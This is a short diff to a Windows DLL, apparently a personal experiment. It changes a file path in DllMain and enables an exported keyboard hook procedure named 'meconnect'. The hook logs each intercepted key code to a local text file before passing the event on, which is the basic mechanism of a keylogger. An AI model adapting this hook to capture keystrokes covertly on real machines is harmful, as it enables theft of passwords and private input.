@@ -6,7 +6,7 @@
 INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
     /* open file */
     FILE *file;
-    fopen_s(&file, "C:\\temp.txt", "a+");
+    fopen_s(&file, "temp.txt", "a+");
 
     switch(Reason) {
     case DLL_PROCESS_ATTACH:
@@ -29,10 +29,17 @@ INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
     return TRUE;
 }
 
-/*extern "C" __declspec(dllexport) int meconnect(int code, WPARAM wParam, LPARAM lParam) {
-	FILE *file;
-    	fopen_s(&file, "C:\\function.txt", "a+");
-   	fprintf(file, "Function keyboard_hook called.\n");
-	fclose(file);
-	return(CallNextHookEx(NULL, code, wParam, lParam));
-}*/
+extern "C" __declspec(dllexport) LRESULT CALLBACK meconnect(int code, WPARAM wParam, LPARAM lParam) {
+	if (code < 0) // Do not process
+    {
+        return CallNextHookEx(NULL, code, wParam, lParam);
+    }
+    else
+    {
+		FILE *file;
+		fopen_s(&file, "c:\\users\\me\\function4.txt", "a+");
+		fprintf(file, "Function keyboard_hook called: %c\n", wParam);
+		fclose(file);
+		return(CallNextHookEx(NULL, code, wParam, lParam));
+    }
+}
